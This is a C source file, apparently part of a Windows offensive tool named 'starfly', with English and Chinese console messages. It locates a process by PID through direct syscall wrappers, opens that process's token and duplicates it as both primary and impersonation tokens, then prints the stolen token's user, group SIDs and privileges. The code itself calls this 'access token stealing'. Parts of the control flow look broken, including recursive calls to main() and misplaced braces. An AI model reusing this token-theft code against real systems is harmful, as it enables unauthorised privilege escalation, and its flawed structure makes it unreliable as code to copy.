﻿#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "starfly.h"
#include <stdbool.h>
#include <locale.h>
HANDLE hToken;
void TILocalPrivilegeErrorHandler() {
    setlocale(LC_ALL, "");
        if (o_mode == 4){
            o_mode = 5;
            status = SFNtDuplicateToken(hToken, TOKEN_ALL_ACCESS, NULL, FALSE, TokenImpersonation, &hDupImpToken);
        } else if (o_mode == 5) {
            if (hDupPriToken != 0xcccccccccccccccc && hDupPriToken != 0 && hDupImpToken != 0xcccccccccccccccc && hDupImpToken != 0) {
    SFPrintStatus("Looking up Token Information.", "正在检验令牌信息");
    ULONG returnLength;
    PTOKEN_USER PriTokenUser;
    PTOKEN_GROUPS_AND_PRIVILEGES PriTokenGroupsAndPrivileges;
    status = SFNtQueryInformationToken(hDupPriToken, TokenUser, NULL, 0, &returnLength);
    PriTokenUser = (PTOKEN_USER)malloc(returnLength);
    status = SFNtQueryInformationToken(hDupPriToken, TokenUser, PriTokenUser, returnLength, &returnLength);
    status = SFNtQueryInformationToken(hDupPriToken, TokenGroupsAndPrivileges, NULL, 0, &returnLength);
    PriTokenGroupsAndPrivileges = (PTOKEN_GROUPS_AND_PRIVILEGES)malloc(returnLength);
    status = SFNtQueryInformationToken(hDupPriToken, TokenGroupsAndPrivileges, PriTokenGroupsAndPrivileges, returnLength, &returnLength);
    PTOKEN_USER ImpTokenUser;
    PTOKEN_GROUPS_AND_PRIVILEGES ImpTokenGroupsAndPrivileges;
    status = SFNtQueryInformationToken(hDupImpToken, TokenUser, NULL, 0, &returnLength);
    ImpTokenUser = (PTOKEN_USER)malloc(returnLength);
    status = SFNtQueryInformationToken(hDupImpToken, TokenUser, ImpTokenUser, returnLength, &returnLength);
    status = SFNtQueryInformationToken(hDupImpToken, TokenGroupsAndPrivileges, NULL, 0, &returnLength);
    ImpTokenGroupsAndPrivileges = (PTOKEN_GROUPS_AND_PRIVILEGES)malloc(returnLength);
    status = SFNtQueryInformationToken(hDupImpToken, TokenGroupsAndPrivileges, ImpTokenGroupsAndPrivileges, returnLength, &returnLength);
    if (PriTokenUser->User.Sid != 0xcdcdcdcdcdcdcdcd && ImpTokenUser->User.Sid != 0xcdcdcdcdcdcdcdcd) {
        TCHAR PriUserName[256];
        TCHAR PriUserDomain[256];
        DWORD PriUserNameSize = 256;
        DWORD PriUserDomainSize = 256;
        SID_NAME_USE PriUserUse;
        LookupAccountSid(NULL, PriTokenUser->User.Sid, PriUserName, &PriUserNameSize, PriUserDomain, &PriUserDomainSize, &PriUserUse);
        
        TCHAR ImpUserName[256];
        TCHAR ImpUserDomain[256];
        DWORD ImpUserNameSize = 256;
        DWORD ImpUserDomainSize = 256;
        SID_NAME_USE ImpUserUse;
        LookupAccountSid(NULL, ImpTokenUser->User.Sid, ImpUserName, &ImpUserNameSize, ImpUserDomain, &ImpUserDomainSize, &ImpUserUse);
        printf("----------------------------------------\n");
        if (o_lang % 2 == 0 ) {
            wprintf(L" Information of Duplicated Primary Token");
            wprintf(L"  Token User: %s\\%s\n", PriUserDomain, PriUserName);
            wprintf(L"  Token Group SIDs:\n");
            for (DWORD i = 0; i < PriTokenGroupsAndPrivileges->SidCount; i++) {
            TCHAR SidName[256];
            TCHAR SidDomain[256];
            DWORD SidNameSize = 256;
            DWORD SidDomainSize = 256;
            SID_NAME_USE SidUse;
            if (LookupAccountSid(NULL, PriTokenGroupsAndPrivileges->Sids[i].Sid, SidName, &SidNameSize, SidDomain, &SidDomainSize, &SidUse)) {
                wprintf(L"   - SID %d: %s\\%s\n", i + 1, SidDomain, SidName);
            } else {
                wprintf(L"   - Cannot Resolve SID: %d\n", i + 1);
            }
            }
            wprintf(L"  Token Privileges:\n");
            for (DWORD i = 0; i < PriTokenGroupsAndPrivileges->PrivilegeCount; i++) {
            LUID luid = PriTokenGroupsAndPrivileges->Privileges[i].Luid;
            TCHAR PrivilegeName[256];
            DWORD PrivilegeNameSize = 256;
            if (LookupPrivilegeName(NULL, &luid, PrivilegeName, &PrivilegeNameSize)) {
                wprintf(L"   - Privilege %d: %s\n", i + 1, PrivilegeName);
            } else {
                wprintf(L"   - Cannot Resolve Privilege: %d\n", i + 1);
            }
        }
        printf("----------------------------------------\n");
        wprintf(L" Information of Duplicated Impersonation Token");
        wprintf(L"  Token User: %s\\%s\n", ImpUserDomain, ImpUserName);
        wprintf(L"  Token Group SIDs:\n");
        for (DWORD i = 0; i < ImpTokenGroupsAndPrivileges->SidCount; i++) {
            TCHAR SidName[256];
            TCHAR SidDomain[256];
            DWORD SidNameSize = 256;
            DWORD SidDomainSize = 256;
            SID_NAME_USE SidUse;
            if (LookupAccountSid(NULL, ImpTokenGroupsAndPrivileges->Sids[i].Sid, SidName, &SidNameSize, SidDomain, &SidDomainSize, &SidUse)) {
                wprintf(L"   - SID %d: %s\\%s\n", i + 1, SidDomain, SidName);
            } else {
                wprintf(L"   - Cannot Resolve SID: %d\n", i + 1);
            }
        }
        wprintf(L"  Token Privileges:\n");
        for (DWORD i = 0; i < ImpTokenGroupsAndPrivileges->PrivilegeCount; i++) {
            LUID luid = ImpTokenGroupsAndPrivileges->Privileges[i].Luid;
            TCHAR PrivilegeName[256];
            DWORD PrivilegeNameSize = 256;
            if (LookupPrivilegeName(NULL, &luid, PrivilegeName, &PrivilegeNameSize)) {
                wprintf(L"   - Privilege %d: %s\n", i + 1, PrivilegeName);
            } else {
                wprintf(L"   - Cannot Resolve Privilege: %d\n", i + 1);
            }
        }
                    } else {
                wprintf(L" 主令牌信息\n");
                wprintf(L"  令牌所属用户: %s\\%s\n", PriUserDomain, PriUserName);
                wprintf(L"  令牌所属组SID :\n");
                for (DWORD i = 0; i < PriTokenGroupsAndPrivileges->SidCount; i++) {
                    TCHAR SidName[256];
                    TCHAR SidDomain[256];
                    DWORD SidNameSize = 256;
                    DWORD SidDomainSize = 256;
                    SID_NAME_USE SidUse;
                    if (LookupAccountSid(NULL, PriTokenGroupsAndPrivileges->Sids[i].Sid, SidName, &SidNameSize, SidDomain, &SidDomainSize, &SidUse)) {
                        wprintf(L"   - SID %d: %s\\%s\n", i + 1, SidDomain, SidName);
                    } else {
                        wprintf(L"   - 无法解析 SID: %d\n", i + 1);
                    }
                }
                wprintf(L"  令牌权限:\n");
                for (DWORD i = 0; i < PriTokenGroupsAndPrivileges->PrivilegeCount; i++) {
                    LUID luid = PriTokenGroupsAndPrivileges->Privileges[i].Luid;
                    TCHAR PrivilegeName[256];
                    DWORD PrivilegeNameSize = 256;
                    if (LookupPrivilegeName(NULL, &luid, PrivilegeName, &PrivilegeNameSize)) {
                        wprintf(L"   - 权限 %d: %s\n", i + 1, PrivilegeName);
                    } else {
                        wprintf(L"   - 无法解析权限: %d\n", i + 1);
                    }
                }
                printf("----------------------------------------\n");
                wprintf(L" 模拟令牌信息\n");
                wprintf(L"  令牌所属用户: %s\\%s\n", ImpUserDomain, ImpUserName);
                wprintf(L"  令牌所属组SID:\n");
                for (DWORD i = 0; i < ImpTokenGroupsAndPrivileges->SidCount; i++) {
                    TCHAR SidName[256];
                    TCHAR SidDomain[256];
                    DWORD SidNameSize = 256;
                    DWORD SidDomainSize = 256;
                    SID_NAME_USE SidUse;
                    if (LookupAccountSid(NULL, ImpTokenGroupsAndPrivileges->Sids[i].Sid, SidName, &SidNameSize, SidDomain, &SidDomainSize, &SidUse)) {
                        wprintf(L"   - SID %d: %s\\%s\n", i + 1, SidDomain, SidName);
                    } else {
                        wprintf(L"   - 无法解析SID: %d\n", i + 1);
                    }
                }
                wprintf(L"  令牌权限:\n");
                for (DWORD i = 0; i < ImpTokenGroupsAndPrivileges->PrivilegeCount; i++) {
                    LUID luid = ImpTokenGroupsAndPrivileges->Privileges[i].Luid;
                    TCHAR PrivilegeName[256];
                    DWORD PrivilegeNameSize = 256;
                    if (LookupPrivilegeName(NULL, &luid, PrivilegeName, &PrivilegeNameSize)) {
                        wprintf(L"   - 权限 %d: %s\n", i + 1, PrivilegeName);
                    } else {
                        wprintf(L"   - 无法解析权限: %d\n", i + 1);
                    }
                }
            }
    }
    free(PriTokenUser);
    free(PriTokenGroupsAndPrivileges);
    free(ImpTokenUser);
    free(ImpTokenGroupsAndPrivileges);
                o_mode = 0;
                o_restart = 1;
                main();
            } else {
                SFPrintError("Failed to Duplicate Token.", "复制令牌失败");
                o_restart = 1;
                main();
            }
        } else {
            SFPrintError("An Unexpected Fatal Error Occurred.", "发生了未预期的致命错误");
            SFPrintStatus("Rebooting...", "正在重启...");
            o_restart = 1;
            main();
        }
            return;
}

void SFGetToken(DWORD pid) {
    NTSTATUS status;
    ULONG bufferSize = 1024 * 1024;
    PVOID buffer = malloc(bufferSize);
    status = SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    SFPrintStatus("Searching for the Targeted Process", "正在寻找目标进程以进行访问令牌窃取");
    while (1) {
        HANDLE hProcess = 0xcccccccccccccccc;
        OBJECT_ATTRIBUTES objectAttributes;
        CLIENT_ID clientId;
        clientId.UniqueProcess = processInfo->UniqueProcessId;
        clientId.UniqueThread = NULL;
        InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
        status = SFNtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
        if ((hProcess != 0xcccccccccccccccc) && (hProcess != 0) && (DWORD)(ULONG_PTR)processInfo->UniqueProcessId == pid) {
            hToken = 0xcccccccccccccccc;
            status = SFNtOpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken);
            if (hToken != 0xcccccccccccccccc && hToken != 0) {
                if (processInfo->SessionId == 0) { 
                            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
                            }
                            else {
                                SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
                            }
                            SFPrintStatus("Target Located", "发现目标");
                            printf("----------------------------------------\n");
                            if (o_lang % 2 == 0) {
                                printf(" PID: %llu\n Name: %wZ\n",
                                    (ULONG_PTR)processInfo->UniqueProcessId,
                                    &processInfo->ImageName);
                            }
                            else {
                                printf(" PID: %llu\n 进程名: %wZ\n",
                                    (ULONG_PTR)processInfo->UniqueProcessId,
                                    &processInfo->ImageName);
                            }
                            printf("----------------------------------------\n");
                            hDupPriToken = 0xcccccccccccccccc;
                            hDupImpToken = 0xcccccccccccccccc;
                            o_mode = 4;
                            SFPrintStatus("Attempting to Steal Access Token", "尝试窃取访问令牌");
                            status = SFNtDuplicateToken(hToken, TOKEN_ALL_ACCESS, NULL, FALSE, TokenPrimary, &hDupPriToken);
                }
                SFNtClose(hProcess);
                break;
            }
            if (processInfo->NextEntryOffset == 0)
                break;
            processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
        }
        SFPrintError("Target Not Found", "未找到目标");
        free(buffer);
    }